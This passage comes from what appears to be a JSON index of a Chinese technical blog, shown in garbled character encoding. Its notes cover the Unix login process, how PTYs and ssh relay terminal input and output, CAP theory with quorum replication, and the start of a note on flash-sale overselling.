è¡¨ç¤ºä¿ç•™è¯¥ç¯å¢ƒå‚æ•°ã€‚ ä¸Šå›¾ä¸­çš„æ‰€æœ‰è¿›ç¨‹ç›®å‰éƒ½å…·æœ‰ root æƒé™ï¼Œå› ä¸ºç›´æ¥ä» init ç»§æ‰¿ forkï¼Œè€Œç»§æ‰¿äº†æƒé™ã€‚å¹¶ä¸” exec å¹¶ä¸æ”¹å˜è¿›ç¨‹ IDï¼Œä¸‹é¢ä¸‰ä¸ªè¿›ç¨‹çš„ ID ç›¸åŒã€‚ è¿™éƒ¨åˆ†è¯´çš„ç»ˆç«¯éƒ½ä¸æ˜¯ä¼ªç»ˆç«¯ login æ¥ä¸‹æ¥çš„ login çš„å·¥ä½œæ˜¯ï¼š getpwnam å–å¾—ç”¨æˆ·å£ä»¤æ–‡ä»¶ getpass è¯»å–ç”¨æˆ·è¾“å…¥å¯†ç  crypt å¯¹è¾“å…¥å¯†ç åŠ å¯†ï¼Œå¹¶äº shadow æ–‡ä»¶ä¸­çš„ pw_passwd å­—æ®µæ¯”è¾ƒ è‹¥å£ä»¤æ— æ•ˆï¼Œexit(1) init è¿›ç¨‹è¯»å–è¿”å›å€¼åï¼Œå†æ¬¡ fork æ‰§è¡Œ gettyï¼Œé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚ ä»¥ä¸Šæ˜¯UNIXç³»ç»Ÿçš„ç”¨æˆ·ç™»å½•éªŒè¯è¿‡ç¨‹ï¼ŒLinux ç­‰åç»­è¾ƒæ–°çš„ç³»ç»Ÿä½¿ç”¨æ›´çµæ´»çš„ PAM éªŒè¯æ–¹æ¡ˆã€‚ login ä¹‹å å®Œæˆ login ä¹‹åï¼š chdir åˆ°ç”¨æˆ·èµ·å§‹ç›®å½• chown æ”¹å˜å½“å‰ç»ˆç«¯æ‰€æœ‰æƒä¸ºå½“å‰ç™»å½•ç”¨æˆ· æ”¹å˜å½“å‰ç»ˆç«¯è®¾å¤‡çš„è®¿é—®æƒé™ä¸º â€œç”¨æˆ·è¯»å†™â€ setgid, initgroups è®¾ç½®è¿›ç¨‹ç»„ ID ç”¨ login å¾—åˆ°çš„ä¿¡æ¯ï¼Œåˆå§‹åŒ–ï¼šHOMEç›®å½•ã€shellã€usernameã€PATH ç­‰ setuid è®¾ç½®è¿›ç¨‹ç”¨æˆ· ID ä¸ºå½“å‰ç™»å½•ç”¨æˆ·çš„ IDï¼Œå¹¶å¯åŠ¨è¯¥ç”¨æˆ·è®¾ç½®çš„ç™»å½• shell 1execl(\"/bin/sh\", \"-sh\", (char *)0); æ­¤å¤„æ˜¯ç”±root è°ƒç”¨çš„ setuidï¼Œæ‰€ä»¥å¯ä»¥è®¾ç½®è¿›ç¨‹çš„ï¼šå®é™…ç”¨æˆ·IDã€æœ‰æ•ˆç”¨æˆ·IDå’Œä¿å­˜ç”¨æˆ·IDã€‚ shell è¯»å–å¯åŠ¨æ–‡ä»¶ï¼Œ.profile ä¹‹ç±»ï¼ˆå¯èƒ½ç”±å…¶ä»–åå­—ï¼‰ åœ¨ç»ˆç«¯è¾“å‡ºè¾“å…¥æç¤ºç¬¦ï¼Œç­‰å¾…ç”¨æˆ·è¾“å…¥å‘½ä»¤ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Linux","slug":"Notes/Linux","permalink":"https://racleray.github.io/categories/Notes/Linux/"}],"tags":[{"name":"Unix","slug":"Unix","permalink":"https://racleray.github.io/tags/Unix/"},{"name":"Shell","slug":"Shell","permalink":"https://racleray.github.io/tags/Shell/"}],"author":"HeRui"},{"title":"shelläº¤äº’é€»è¾‘åˆ†æ","slug":"shelläº¤äº’é€»è¾‘åˆ†æ","date":"2023-04-12T11:53:37.000Z","updated":"2024-01-11T02:08:51.541Z","comments":true,"path":"posts/66515c26.html","link":"","permalink":"https://racleray.github.io/posts/66515c26.html","excerpt":"shell ç»ˆç«¯é€»è¾‘åˆ†æ","text":"åœ¨ terminal emulatorï¼ˆç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼‰ä¸­å¯åŠ¨bashï¼ˆshellï¼‰å­è¿›ç¨‹æ—¶ï¼Œå®ƒæŠŠbashå­è¿›ç¨‹çš„0/1/2ï¼ˆæ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯è¾“å‡ºï¼‰æ–‡ä»¶æè¿°ç¬¦ï¼ˆä»¥æ­¤ fd æ‰¾åˆ°å¯¹åº”çš„ file å®ä¾‹ï¼‰éƒ½æŒ‡å‘è‡ªå·±ï¼ˆçœŸæ­£æŒ‡å‘çš„æ˜¯ terminal emulator å‘å†…æ ¸åˆ†é…çš„PTYæ•°æ®é€šé“çš„slaveç«¯ï¼‰ã€‚è¿™æ ·å½“bashåšæ ‡å‡†è¾“å…¥è¾“å‡ºæ“ä½œæ—¶ï¼Œå®ƒå…¶å®éƒ½æ˜¯åœ¨å’Œ terminal emulatoräº¤äº’ã€‚ bash æœ¬èº«ä¸å¤„ç†é”®ç›˜äº‹ä»¶ï¼Œä¹Ÿä¸è´Ÿè´£è¾“å‡ºï¼Œåªæ˜¯è§£é‡Šç”¨æˆ·è¾“å…¥ã€‚ å½“bashè¦æ‰§è¡ŒæŸä¸ªç¨‹åºæ—¶ï¼Œä¸€èˆ¬è¯­è¨€ç¼–è¯‘å‡ºçš„ç›®æ ‡ç¨‹åºï¼Œä¹Ÿä¼šæŠŠæ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯è¾“å‡ºåˆ†åˆ«å®šä¹‰ä¸º0/1/2ã€‚ åœ¨bashä¸­è¿è¡Œç¨‹åºæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå­è¿›ç¨‹çš„0/1/2æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘æ˜¯ç»§æ‰¿è‡ªbashçš„ï¼Œæ‰€ä»¥ä¹ŸåŒæ ·éƒ½æŒ‡å‘äº†åŒä¸€ä¸ª terminal emulatorã€‚ ä¸¥æ ¼æ¥è®²ï¼Œè¿™é‡Œè®²çš„æ˜¯ pseudo terminal emulator ä¼ªç»ˆç«¯ (PTY)ï¼Œ ä¸è¿è¡Œåœ¨å†…æ ¸çš„ terminal emulator ä¸åŒã€‚PTY è¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´ï¼Œé€šè¿‡å†…æ ¸ä¸­çš„æ•°æ®é€šé“ï¼Œå»ºç«‹è¿›ç¨‹é—´çš„æ•°æ®äº¤äº’ã€‚ å†…æ ¸çš„ terminal emulator è¯»å–é”®ç›˜é©±åŠ¨ä¼ é€’çš„æ•°æ®ï¼Œå‘æ˜¾å¡é©±åŠ¨å‘é€å­—ç¬¦ã€‚é€šè¿‡ tty é©±åŠ¨ä¸ç”¨æˆ·è¿›ç¨‹ç›¸è¿ã€‚ pseudo terminal emulator è¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´ï¼Œæ­¤æ—¶çš„ tty é©±åŠ¨åªè´Ÿè´£ pseudo terminal emulator è¿›ç¨‹ä¸ shell è¿›ç¨‹çš„äº¤äº’ï¼Œç»´æŠ¤ä¸€ä¸ªæ•°æ®äº¤äº’é€šé“ã€‚è€Œ pseudo terminal emulator ä»ç„¶ä¸é”®ç›˜æˆ–è€…æ˜¾å¡é©±åŠ¨äº¤äº’ã€‚ å½“ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå­—ç¬¦ä¼šè¢«å›ä¼ åˆ° PTY masterã€‚åœ¨ terminal emulator è¾“å…¥æ—¶ï¼Œä¼šåœ¨æŒ‡å®šå†…å­˜ä¸­ç¼“å†²è¿™äº›å­—ç¬¦ã€‚å½“ç”¨æˆ·æŒ‰å›è½¦é”®æ—¶ï¼Œå®ƒæ‰å°†è¿™äº›å­—ç¬¦å‘é€åˆ° PTY slaveã€‚ terminal emulator ç›´æ¥æ‰§è¡Œç¨‹åº åœ¨ terminal emulator ä¸­æ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹å¯ä»¥ç®€åŒ–å¦‚ä¸‹ï¼š åœ¨terminal emulatorä¸­è¾“å…¥ ./a.out å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ²¿ç€å†…æ ¸PTYæ•°æ®é€šé“ï¼Œåˆ°è¾¾bashçš„æ ‡å‡†è¾“å…¥ã€‚ bashä»æ ‡å‡†è¾“å…¥ä¸­è¯»å– ./a.out å‘½ä»¤ï¼Œç„¶åè°ƒç”¨forkå‡½æ•°ï¼Œæ–°å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œç”¨äºæ‰§è¡Œ a.out ç¨‹åºã€‚ å­è¿›ç¨‹çš„ æ ‡å‡†è¾“å…¥/è¾“å‡º/é”™è¯¯è¾“å‡º æ–‡ä»¶æè¿°ç¬¦ç»§æ‰¿è‡ªbashï¼ˆå›¾ä¸­çš„è™šçº¿è¡¨ç¤ºåœ¨ä¸Šè¿°ç¨‹åºä¸­æ²¡æœ‰æ•°æ®ä¼ é€’ï¼‰ã€‚ a,out ç¨‹åºæ‰§è¡Œæ—¶ï¼Œä¼šå…ˆå‘æ ‡å‡†è¾“å‡ºå†™ Hello å­—ç¬¦ä¸²ï¼Œç„¶åå†å‘æ ‡å‡†é”™è¯¯è¾“å‡ºå†™worldå­—ç¬¦ä¸²ã€‚ è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ä¼šä¼ é€’ç»™å†…æ ¸PTYæ•°æ®é€šé“ã€‚terminal emulatorä»PTY master fdä¸­è¯»å–è¿™äº›å­—ç¬¦ä¸²ï¼Œå¹¶æ˜¾ç¤ºåœ¨ç•Œé¢ä¸Šã€‚ ä¸Šè¿°ä¾‹å­ä¸­ï¼Œa.out è¿›ç¨‹çš„0/1/2æ–‡ä»¶æè¿°ç¬¦ï¼Œéƒ½æ˜¯æŒ‡å‘å†…æ ¸PTYæ•°æ®é€šé“çš„slaveç«¯ï¼Œå¹¶ä¸”é€šè¿‡è¯¥PTYæ•°æ®é€šé“å’Œterminal emulatoräº¤äº’ã€‚ ssh è¿æ¥è¿œç¨‹ç»ˆç«¯æ‰§è¡Œç¨‹åº åœ¨terminal emulatorä¸­è¾“å…¥./a.outå‘½ä»¤åï¼Œè¯¥å‘½ä»¤ä¼šæ²¿ç€å†…æ ¸PTYæ•°æ®é€šé“ï¼Œåˆ°è¾¾sshè¿›ç¨‹çš„æ ‡å‡†è¾“å…¥ã€‚ sshè¿›ç¨‹ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–åˆ°./a.outå‘½ä»¤ï¼Œç„¶åå°†å…¶å†™åˆ°socket fdé‡Œã€‚ è¯¥å‘½ä»¤ä¼šæ²¿ç€socket fdæŒ‡å‘çš„tcpè¿æ¥ï¼Œåˆ°è¾¾æœºå™¨2çš„å¯¹åº”socketç«¯ã€‚ åœ¨æœºå™¨2ä¸Šï¼Œsshdè¿›ç¨‹ä»å®ƒçš„socket fdä¸­è¯»å–åˆ°./a.outå‘½ä»¤ï¼Œç„¶åå°†å…¶å†™åˆ°PTY master fdä¸­ã€‚ è¯¥å‘½ä»¤åˆä¼šæ²¿ç€æœºå™¨2çš„å†…æ ¸PTYæ•°æ®é€šé“ï¼Œåˆ°è¾¾bashè¿›ç¨‹çš„æ ‡å‡†è¾“å…¥ã€‚ æœºå™¨2ä¸Šçš„bashè¿›ç¨‹ï¼Œä»æ ‡å‡†è¾“å…¥ä¸­è¯»åˆ°è¯¥å‘½ä»¤ï¼Œç„¶åè°ƒç”¨forkå‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œç”¨äºæ‰§è¡Œa.outç¨‹åºã€‚ a.outç¨‹åºæ‰§è¡Œæ—¶ï¼Œä¼šå†™helloåˆ°æ ‡å‡†è¾“å‡ºï¼Œå†™worldåˆ°æ ‡å‡†é”™è¯¯è¾“å‡ºï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²åˆä¼šæ²¿ç€æœºå™¨2çš„å†…æ ¸PTYæ•°æ®é€šé“ï¼Œåˆ°è¾¾sshdè¿›ç¨‹çš„PTY master fdã€‚ sshdè¿›ç¨‹ä»PTY master fdä¸­è¯»å–åˆ°a.outè¿›ç¨‹è¾“å‡ºçš„å†…å®¹ï¼Œå¹¶å†™åˆ°socket fdé‡Œã€‚ è¯¥æ•°æ®åˆæ²¿ç€socket fdæŒ‡å‘çš„tcpè¿æ¥ï¼Œæœ€ç»ˆä¼šåˆ°è¾¾æœºå™¨1å¯¹åº”çš„socketç«¯ã€‚ æœºå™¨1ä¸­çš„sshè¿›ç¨‹ï¼Œä»socket fdé‡Œè¯»å–åˆ°a.outç¨‹åºçš„è¾“å‡ºå†…å®¹ï¼Œå¹¶å°†å…¶å†™åˆ°æ ‡å‡†è¾“å‡ºã€‚ è¯¥æ•°æ®ä¼šæ²¿ç€æœºå™¨1çš„å†…æ ¸PTYæ•°æ®é€šé“ï¼Œåˆ°è¾¾terminal emulatorçš„PTY master fdã€‚ terminal emulatorä»PTY master fdä¸­è¯»å–åˆ°å¯¹åº”çš„æ•°æ®ï¼Œæœ€ç»ˆå°†å…¶æ˜¾ç¤ºåœ¨æœºå™¨1å±å¹•ä¸Šã€‚ a.out è¿›ç¨‹çš„ 0 1 2 æ–‡ä»¶æè¿°ç¬¦éƒ½æ˜¯æŒ‡å‘æœºå™¨2ä¸­ PTY slave ç«¯ï¼Œé€šè¿‡ tcp é“¾è·¯ä¸æœºå™¨1 ä¸­ terminal emulator ç›¸è¿ã€‚ æœºå™¨1ä¸­å¯¹ terminal emulator çš„è¾“å…¥ï¼Œæœ€ç»ˆè¢«æœºå™¨2 çš„ ./a.out è¯»å‡ºã€‚./a.out çš„è¾“å‡ºï¼Œæœ€ç»ˆè¿”å›åˆ°æœºå™¨1çš„ terminal emulator è¿›ç¨‹è¾“å‡ºæ˜¾ç¤ºã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Linux","slug":"Notes/Linux","permalink":"https://racleray.github.io/categories/Notes/Linux/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://racleray.github.io/tags/Shell/"}],"author":"HeRui"},{"title":"CAPç†è®º","slug":"CAPç†è®º","date":"2023-04-12T06:24:12.000Z","updated":"2024-01-09T09:29:28.417Z","comments":true,"path":"posts/6940af88.html","link":"","permalink":"https://racleray.github.io/posts/6940af88.html","excerpt":"CAP å­¦ä¹ ç¬”è®°","text":"åŸºæœ¬æ¦‚å¿µ Consistency ä¸€è‡´æ€§ æ‰€æœ‰èŠ‚ç‚¹ è®¿é—® åŒä¸€ä»½æœ€æ–° çš„æ•°æ®å‰¯æœ¬ï¼Œæœ€æ–° æ„å‘³ç€æ‰€æœ‰çš„æ•°æ®ä¸èƒ½éƒ½æ˜¯é”™è¯¯çš„ Availablity å¯ç”¨æ€§ æ¯æ¬¡è¯·æ±‚éƒ½èƒ½è·å–åˆ° éé”™çš„ å“åº”ï¼Œä½†æ˜¯ä¸èƒ½ä¿è¯æ•°æ®æ—¶æœ€æ–°çš„ Partition Tolerance åˆ†åŒºå®¹é”™æ€§ åˆ†åŒºç›¸å½“äºå¯¹é€šä¿¡æ—¶é™çš„è¦æ±‚ï¼Œç³»ç»Ÿå¦‚æœä¸èƒ½åœ¨ä¸€å®šæ—¶é™å†…è¾¾æˆæ•°æ®ä¸€è‡´æ€§ï¼Œå°±æ„å‘³ç€å‡ºç°äº†åˆ†åŒº å¿…é¡»åœ¨ å¯ç”¨æ€§ å’Œ ä¸€è‡´æ€§ ä¹‹é—´åšå‡ºé€‰æ‹© ä¹Ÿå°±æ˜¯å®¹å¿åˆ†å¸ƒå¼èŠ‚ç‚¹ä¹‹é—´çš„ç½‘ç»œåŒ…ä¸¢å¤±æˆ–è€…å»¶æ—¶ï¼Œè®©ç³»ç»Ÿä»ç„¶èƒ½æ­£å¸¸è¿è¡Œ åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå½“èŠ‚ç‚¹ä¹‹é—´ç”±äºå‡ºç°æ•…éšœï¼Œåˆ†åŒºèŠ‚ç‚¹ä¹‹é—´ä¸è¿é€šï¼Œå¯¼è‡´æ— æ³•è®¿é—®æŒ‡å®šæ•°æ®ã€‚è¿™æ—¶çš„åˆ†åŒºæ˜¯ä¸èƒ½å®¹å¿çš„ã€‚ ä¸ºäº†æé«˜åˆ†åŒºå®¹é”™æ€§èƒ½ï¼Œå°±éœ€è¦å°†æ•°æ®ä¿å­˜åœ¨ä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œä½¿ç”¨å¤šä¸ªå‰¯æœ¬ã€‚ä½†æ˜¯å‰¯æœ¬è¶Šå¤šï¼Œä¿®æ”¹æ•°æ®æ—¶ï¼Œä¿æŒæ•°æ®ä¸€è‡´æ€§çš„ä»£ä»·å°±è¶Šå¤§ã€‚å¦‚æœè¦ä¿è¯ä¸€è‡´æ€§ï¼Œé‚£ä¹ˆå°±éœ€è¦èŠ±æ›´å¤šçš„æ—¶é—´æ¥åŒæ­¥æ•°æ®ã€‚ è¿™ä¸€å»¶è¿Ÿå¦‚æœå¾ˆé•¿ï¼Œåˆå°†å¯¼è‡´å¯ç”¨æ€§é™ä½ã€‚ è¿™å°±æ˜¯ CAP çš„æ ¸å¿ƒçŸ›ç›¾æ‰€åœ¨ã€‚ è¿™é‡Œçš„ä¸€è‡´æ€§ï¼Œå’Œå…³ç³»å‹æ•°æ®åº“äº‹åŠ¡ACIDçš„Cä¸€è‡´æ€§ä¸åŒã€‚ åˆ†å¸ƒå¼Cï¼šåŒä¸€å‰¯æœ¬çš„ä¸€è‡´æ€§ äº‹åŠ¡Cï¼šä¸€ç§ä¸€è‡´æ€§å…³ç³»ï¼Œaå’Œbè½¬è´¦ï¼Œé‚£ä¹ˆåœ¨è½¬è´¦å‰ä¸­åï¼Œé‡‘é¢æ€»æ•°éƒ½æ˜¯ä¸€æ ·çš„ã€‚ å¯¹äºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿè€Œè¨€ï¼Œä¸å¯èƒ½åŒæ—¶æ»¡è¶³ä»¥ä¸Šä¸‰ç‚¹ã€‚ è‹¥æ²¡æœ‰ç½‘ç»œæ³¢åŠ¨å’Œç½‘ç»œåˆ†åŒºï¼Œåªéœ€è¦CAï¼ŒPæ— ä»è°ˆèµ·ï¼› è‹¥å‡ºç°ç½‘ç»œæ³¢åŠ¨å’Œç½‘ç»œåˆ†åŒºï¼Œä¸ºäº†ä¿è¯Pï¼ŒCå’ŒAåªèƒ½é€‰æ‹©å…¶ä¸€ã€‚ æ³¨æ„è¿™é‡Œçš„äºŒé€‰ä¸€ï¼Œæ˜¯åœ¨è¦è¾¾åˆ°ä¸¥æ ¼çš„Cæˆ–è€…Aæ¡ä»¶ä¸‹ã€‚å¯ä»¥å­˜åœ¨äºŒè€…çš„æŠ˜ä¸­é€‰æ‹©ï¼Œè¿™ä¹Ÿæ˜¯å„ç§ç³»ç»Ÿä¼˜åŒ–ç®—æ³•çš„ç›®çš„ã€‚å¯ç”¨æ€§æ˜¯å¯ä»¥åœ¨ 0% åˆ° 100% ä¹‹é—´è¿ç»­å˜åŒ–çš„ã€‚ä¸€è‡´æ€§å¯ä»¥ç»†åˆ†ä¸ºå¼ºä¸€è‡´ã€å¼±ä¸€è‡´å’Œæœ€ç»ˆä¸€è‡´ã€‚ç³»ç»Ÿçš„ä¸åŒåˆ†åŒºä¹Ÿå¯ä»¥æœ‰ä¸åŒçš„è®¤çŸ¥ã€‚ é€€ä¸€æ­¥è®²ï¼Œæˆ‘ä»¬ä½¿ç”¨ç¼“å­˜ï¼Œä¸å°±æ˜¯åœ¨è¿½æ±‚è®¿é—®é€Ÿåº¦å—ï¼Ÿé‚£ä¹ˆï¼Œå¦‚æœç³»ç»Ÿå¯¹ä¸€è‡´æ€§æ€§è¦æ±‚å¾ˆé«˜ï¼Œé‚£ä¹ˆä¹Ÿè®¸è¯¥ç³»ç»Ÿå°±ä¸é€‚åˆä½¿ç”¨ç¼“å­˜ã€‚ä½¿ç”¨ç¼“å­˜ï¼Œå°±è¡¨ç¤ºç€ç³»ç»Ÿåº”è¯¥æ¥å—å¼±ä¸€è‡´æ€§æˆ–è€…æœ€ç»ˆä¸€è‡´æ€§ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ˜¯é€šè¿‡ä¸€å®šæ–¹æ¡ˆï¼Œæ¥æœ€å¤§é™åº¦åœ°é¿å…æ•°æ®ä¸ä¸€è‡´æˆ–è€…å‡å°‘è¾¾åˆ°æœ€ç»ˆä¸€è‡´çš„æ—¶é—´ï¼Œæ¯”å¦‚å»¶æ—¶åŒåˆ ã€å¼‚æ­¥æ›´æ–°ã€ä¸²è¡ŒåŒ–ç­‰ã€‚ CAPç¤ºä¾‹ CAPæ˜¯ä¸ªè¯´æ˜ä»€ä¹ˆæ˜¯ä¸å¯è¡Œçš„ç†è®ºã€‚ å‡è®¾ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿæœ‰ä¸‰å°serverï¼Œç”¨æˆ·å‘å…¶è¿›è¡Œå†™å…¥æ“ä½œã€‚è‹¥å…¶ä¸­ä¸€ä¸ªserverå†™å…¥æˆåŠŸå°±ç®—å‘ç³»ç»Ÿå†™å…¥æˆåŠŸã€‚ æ­¤æ—¶ï¼Œè‹¥å‡ºç°ç½‘ç»œé—®é¢˜ï¼Œä¸‰å°serveræ•°æ®å°±å¯èƒ½å‡ºç°ä¸ä¸€è‡´ï¼ŒCæ— æ³•ä¿è¯ã€‚ä½†æ˜¯ç³»ç»Ÿè®¤ä¸ºæˆåŠŸï¼Œè¿”å›äº†ç»“æœï¼ŒAå¾—åˆ°ä¿è¯ã€‚ å‡è®¾ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿæœ‰ä¸‰å°serverï¼Œç”¨æˆ·å‘å…¶è¿›è¡Œå†™å…¥æ“ä½œã€‚è‹¥ä¸‰ä¸ªserveréƒ½å†™å…¥æˆåŠŸæ‰ç®—å‘ç³»ç»Ÿå†™å…¥æˆåŠŸã€‚ æ­¤æ—¶ï¼Œè‹¥å‡ºç°ç½‘ç»œé—®é¢˜ï¼Œä¸‰å°serveræ•°æ®ä¸èƒ½åŒæ—¶å†™å…¥æˆåŠŸï¼Œç³»ç»Ÿè¿”å›é”™è¯¯ï¼ŒAæ— æ³•ä¿è¯ã€‚ä½†æ˜¯å‰¯æœ¬ä¸€è‡´æ€§å¾—åˆ°ä¿è¯ï¼ŒAå¾—åˆ°ä¿è¯ã€‚ åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„CAP é¦–å…ˆï¼Œåˆ†å¸ƒå¼ç¯å¢ƒä¸‹ï¼Œä¸€èˆ¬Pæ˜¯ä¸€å®šå­˜åœ¨çš„ï¼Œéœ€è¦æƒè¡¡çš„æ˜¯ C å’Œ Aã€‚ å¯¹äºNoSQLï¼Œæ³¨é‡å¯ç”¨æ€§ï¼Œæ˜¯ä¸€ä¸ª AP ç³»ç»Ÿ å¯¹äºåˆ†å¸ƒå¼å…³ç³»å‹æ•°æ®åº“ï¼Œå¿…é¡»è¦ä¿è¯ä¸€è‡´æ€§ï¼Œæ˜¯ä¸€ä¸ª CP ç³»ç»Ÿ åˆ†å¸ƒå¼å…³ç³»å‹æ•°æ®åº“ï¼Œä¸èƒ½ä¿è¯å®Œå…¨çš„100%å¯ç”¨æ€§ï¼Œä½†æ˜¯ä¸€èˆ¬è¦æ±‚ 99.999% çš„é«˜å¯ç”¨æ€§ã€‚æ‰€ä»¥è¢«å®šä¹‰ä¸º CP + HA ç³»ç»Ÿã€‚å…¶æœ‰ä¸¤ä¸ªæŒ‡æ ‡ï¼š RPOï¼ˆRecovery Point Objectiveï¼‰ï¼šæ¢å¤ç‚¹ç›®æ ‡ã€‚ä¸€èˆ¬åˆ†å¸ƒå¼æ•°æ®åº“ä¸ä¼šå…¨éƒ¨åŒæ—¶å®•æœºæˆ–è€…å—ç¾ï¼Œåªè¦æœ‰ä¸€å°ä¿ç•™ä¸‹äº†æœ€æ–°æ•°æ®ï¼ŒRPOå°±ä¸º0ã€‚ RTOï¼ˆRecovery Time Objectiveï¼‰ï¼šæ¢å¤æ—¶é—´ç›®æ ‡ã€‚äº‹æ•…åæ•´ä¸ªç³»ç»Ÿæ¢å¤æ­£å¸¸æ‰€éœ€çš„æ—¶é—´ï¼Œé€šè¿‡ä¸»å¤‡åˆ‡æ¢ã€é‡æ–°é€‰ä¸»ç­‰ï¼Œä»å¯ä»¥æ¢å¤æ­£å¸¸æœåŠ¡ã€‚ä¸€èˆ¬è€Œè¨€ RTO ä¼šåœ¨å‡ åˆ†é’Ÿå†…ã€‚åƒä¸€äº›ä½¿ç”¨raftåè®®çš„æ•°æ®åº“ï¼ŒRTOä¼šåœ¨30ç§’å†…ã€‚ åˆ†å¸ƒå¼æ–¹æ¡ˆ Quorum Replication è¦æ±‚ æ•°æ®æ€»å‰¯æœ¬æ•°Nï¼Œè¦å°äºï¼Œå†™å…¥æˆåŠŸå‰¯æœ¬æ•°W ä¸ è¯»å–æˆåŠŸå‰¯æœ¬æ•°R ä¹‹å’Œã€‚å³ï¼Œæ°¸è¿œä¼šæœ‰è‡³å°‘ä¸€ä¸ªå‰¯æœ¬æ˜¯æœ€æ–°çš„ä¸”æ­£ç¡®è¿”å›çš„ã€‚ åœ¨æ­¤åŸºç¡€ä¸Šï¼Œè¿›è¡Œ trade offã€‚ æ¯”å¦‚ï¼ŒW=Nã€R=1ã€‚æ­¤æ—¶æ‰€æœ‰èŠ‚ç‚¹éƒ½å†™å…¥æˆåŠŸï¼Œæ‰è¿”å›ç³»ç»Ÿå†™å…¥æˆåŠŸï¼Œä¿è¯äº†å†™ä¸€è‡´æ€§ï¼Œå†™å¯ç”¨æ€§å·®ã€‚åªè¦æœ‰ä¸€ä¸ªèŠ‚ç‚¹å¯è¯»åˆ°æ•°æ®ï¼Œå°±è®©ç³»ç»Ÿè¿”å›ç»“æœï¼Œä¿è¯äº†è¯»å¯ç”¨æ€§ï¼Œè¯»ä¸€è‡´æ€§å·®ã€‚ W=1ã€R=Nã€‚æ­¤æ—¶æœ‰ä¸€ä¸ªèŠ‚ç‚¹å†™å…¥æˆåŠŸï¼Œå°±è¿”å›ç³»ç»Ÿå†™å…¥æˆåŠŸï¼Œä¿è¯äº†å†™å¯ç”¨æ€§ï¼Œå†™ä¸€è‡´æ€§å·®ã€‚æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯è¯»åˆ°æœ€æ–°æ•°æ®ï¼Œæ‰è®©ç³»ç»Ÿè¿”å›ç»“æœï¼Œä¿è¯äº†è¯»ä¸€è‡´æ€§ï¼Œè¯»å¯ç”¨æ€§å·®ã€‚ å…±è¯†ç®—æ³• ä¸åŒèŠ‚ç‚¹é—´æœ‰é€šä¿¡äº¤äº’ï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªleaderèŠ‚ç‚¹ç®¡ç†è¯»å†™æœåŠ¡ï¼Œä¿è¯äº†ä¸€è‡´æ€§ã€‚ä½†æ˜¯leaderèŠ‚ç‚¹å‡ºç°é—®é¢˜ï¼Œå°±ä¸èƒ½ä¿è¯å¯ç”¨æ€§ã€‚é€šè¿‡é€‰ä¸¾ç®—æ³•ï¼Œå¿«é€Ÿå»ºç«‹ä¸€ä¸ªæ–°leaderï¼Œä¿è¯ 99.999% çš„é«˜å¯ç”¨æ€§ã€‚","categories":[{"name":"Distributed System","slug":"Distributed-System","permalink":"https://racleray.github.io/categories/Distributed-System/"}],"tags":[{"name":"Distributed System","slug":"Distributed-System","permalink":"https://racleray.github.io/tags/Distributed-System/"},{"name":"CAP","slug":"CAP","permalink":"https://racleray.github.io/tags/CAP/"}],"author":"HeRui"},{"title":"è¶…å–é—®é¢˜æµ…æ","slug":"è¶…å–é—®é¢˜æµ…æ","date":"2023-03-09T05:26:42.000Z","updated":"2024-01-09T10:22:16.160Z","comments":true,"path":"posts/c47fc989.html","link":"","permalink":"https://racleray.github.io/posts/c47fc989.html","excerpt":"ä¸€ä¸ªç®€å•ç³»ç»Ÿè®¾è®¡é—®é¢˜åˆ†æ","text":"é—®é¢˜éš¾ç‚¹ 1 çªå‘è®¿é—®é‡ å‰ç«¯ä¼˜åŒ– ç§’æ€å€’è®¡æ—¶ï¼Œä¸èƒ½å‘é€ä¸‹å•è¯·æ±‚ï¼Œä¸‹å•é”®ä¸å¯ç”¨ ä¸‹å•åï¼Œä¸èƒ½é‡å¤ä¸‹å•è¯·æ±‚ï¼Œä¸‹å•é”®ä¸å¯ç”¨ JSç¨‹åºè®¾ç½®ç”¨æˆ·è¯·æ±‚æœ€å°é—´éš”æ—¶é—´ ä½¿ç”¨å‰ç«¯ç¼“å­˜ï¼Œç›¸åŒé¡µé¢ç›´æ¥ä»ç¼“å­˜åˆ·æ–° åç«¯ä¼˜åŒ– è§åæ–‡ è¡Œä¸šæ–¹æ¡ˆ ä½¿ç”¨é˜Ÿåˆ—ç»„ç»‡ nginx æ¥æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸šåŠ¡æœåŠ¡å™¨ä»é˜Ÿåˆ—ä¸­å–ï¼Œé¡ºåºå¤„ç† è´Ÿè½½å‡è¡¡ æå‡æœºå™¨æ•°é‡ nginx æ¥å…¥å±‚ç­›é€‰é™æµï¼Œå†è½¬å‘åˆ°æœåŠ¡å™¨ 2 å¸¦å®½é™åˆ¶ çªå‘æµé‡å¤ªå¤§ï¼Œéœ€è¦ä»è¿è¥å•†ä¸´æ—¶è´­ä¹° 